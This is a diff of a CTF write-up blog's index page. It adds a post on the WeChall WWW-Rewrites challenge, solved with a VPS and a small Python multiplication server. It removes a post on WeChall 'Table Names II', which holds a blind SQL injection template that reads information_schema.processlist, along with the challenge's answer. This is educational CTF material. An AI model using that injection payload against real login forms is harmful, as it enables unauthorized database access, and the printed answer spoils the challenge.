@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">358</span>
+          <span class="site-state-item-count">359</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -375,6 +375,120 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-www-rewrites/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-training-www-rewrites/" class="post-title-link" itemprop="url">WeChall - Training - WWW-Rewrites</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-14 16:42:38 / Modified: 16:44:24" itemprop="dateCreated datePublished" datetime="2026-06-14T16:42:38+08:00">2026-06-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-training-www-rewrites/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-www-rewrites/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>WeChall 会请求你服务器的
+<code>/WechallUsername/[0-9]+_mul_[0-9]+.html</code>
+路径，你的服务器需返回两数乘积。</p>
+<p>表单只提交 port，IP 由 WeChall 自动检测（从请求的 TCP 源 IP）。</p>
+<h3 id="solution">Solution</h3>
+<p>需要一台满足两个条件的机器： 1. 公网 IP 可被 WeChall 访问（入站） 2.
+能出站到 WeChall（提交表单）</p>
+<h4 id="方案临时-vultr-vps">方案：临时 Vultr VPS</h4>
+<p>用 <code>vultr-cli</code> 在 Frankfurt 区域开一台 Debian 12 VPS：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 CLI</span></span><br><span class="line"><span class="built_in">sudo</span> pacman -S vultr-cli</span><br><span class="line"><span class="built_in">export</span> VULTR_API_KEY=<span class="string">&#x27;your-api-key&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开机器</span></span><br><span class="line">vultr-cli instance create --region fra --plan vc2-1c-1gb --os 2136 --host wechall-ctf</span><br></pre></td></tr></table></figure>
+<p>拿到 IP 和 root 密码后：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 部署 rewrite server</span></span><br><span class="line">scp rw.py root@IP:/tmp/</span><br><span class="line">ssh root@IP <span class="string">&#x27;nohup python3 /tmp/rw.py 8889 &gt; /tmp/rw.log 2&gt;&amp;1 &amp;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开放防火墙</span></span><br><span class="line">ssh root@IP <span class="string">&#x27;ufw allow 8889/tcp&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交表单</span></span><br><span class="line">curl -b <span class="string">&#x27;WC=YOUR_COOKIE&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;port=8889&amp;go=I+have+set+it+up.+Please+check+my+server.&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/training/www/rewrite/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="rewrite-server">Rewrite Server</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.server, re, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">H</span>(http.server.BaseHTTPRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&#x27;^/WechallUsername/([0-9]+)_mul_([0-9]+)\.html$&#x27;</span>, <span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            r = <span class="built_in">str</span>(<span class="built_in">int</span>(m.group(<span class="number">1</span>)) * <span class="built_in">int</span>(m.group(<span class="number">2</span>)))</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="variable language_">self</span>.wfile.write(r.encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="variable language_">self</span>.wfile.write(<span class="string">b&#x27;ready&#x27;</span>)</span><br><span class="line"></span><br><span class="line">httpd = http.server.HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])), H)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure>
+<h4 id="注意事项">注意事项</h4>
+<ul>
+<li>注意开放 UFW/iptables 端口（Vultr Debian 默认 INPUT DROP）</li>
+<li>Vultr 防火墙组也要加规则，或者不用 Vultr 防火墙直接用 UFW</li>
+<li>用完删实例避免继续计费：<code>vultr-cli instance delete &lt;ID&gt;</code></li>
+<li>最低成本 ~$0.004/hr（vc2-1c-1gb 约 $5/月，按小时计费）</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1463,121 +1577,6 @@ token 生成，再用响应页面中的新 CSRF 推导同一种子下的 token�
 fundings=1，条件仍然 fundings &gt;= domains。只有
 <code>purchaseDomain</code> 成功两次而 <code>reduceMoney</code>
 只执行一次，才能制造差值。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-table-names-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-table-names-2/" class="post-title-link" itemprop="url">WeChall - Table Names II</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-13 19:33:08 / Modified: 19:33:09" itemprop="dateCreated datePublished" datetime="2026-06-13T19:33:08+08:00">2026-06-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-table-names-2/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-table-names-2/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>Table Names
-的进阶版。题目要求找出隐藏的数据库名和表名，答案格式是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database_table</span><br></pre></td></tr></table></figure>
-<p>相比第一版，常规的 <code>information_schema.tables</code> /
-<code>database()</code> 路线会被过滤。</p>
-<h3 id="solution">Solution</h3>
-<p>后端查询大致是用隐藏配置拼出完整表名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>secret_database<span class="operator">&gt;</span>.<span class="operator">&lt;</span>secret_table<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>不能直接查 <code>information_schema.tables</code> 时，可以转向
-<code>information_schema.processlist</code>。当前正在执行的 SQL
-文本会出现在 <code>processlist.info</code> 中，而这个 SQL 正好包含完整的
-<code>database.table</code>。</p>
-<p>盲注模板：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>test<span class="string">&#x27; OR IF(</span></span><br><span class="line"><span class="string">  (SELECT ASCII(SUBSTR(info, &lt;pos&gt;, 1)) = &lt;ord&gt;</span></span><br><span class="line"><span class="string">   FROM information_schema.processlist</span></span><br><span class="line"><span class="string">   WHERE info LIKE 0x2553454c45435425</span></span><br><span class="line"><span class="string">   LIMIT 1),</span></span><br><span class="line"><span class="string">  1,</span></span><br><span class="line"><span class="string">  0</span></span><br><span class="line"><span class="string">)#</span></span><br><span class="line"><span class="string">password=test</span></span><br></pre></td></tr></table></figure>
-<p>也可以用二分：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASCII(SUBSTR(info, <span class="operator">&lt;</span>pos<span class="operator">&gt;</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="operator">&lt;</span>mid<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-<p>逐字符恢复 <code>info</code> 后，从 SQL 文本里抽出
-<code>&lt;secret_database&gt;.&lt;secret_table&gt;</code>，再把点号换成下划线提交。</p>
-<p>通过 <code>SUBSTR(info,1,200)</code> 直接从 processlist
-提取完整查询文本，确认当前账号下数据库和表名为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nurfedtables37.userbobbytable7</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">nurfedtables37_userbobbytable7</span></span>
 
       
     </div>
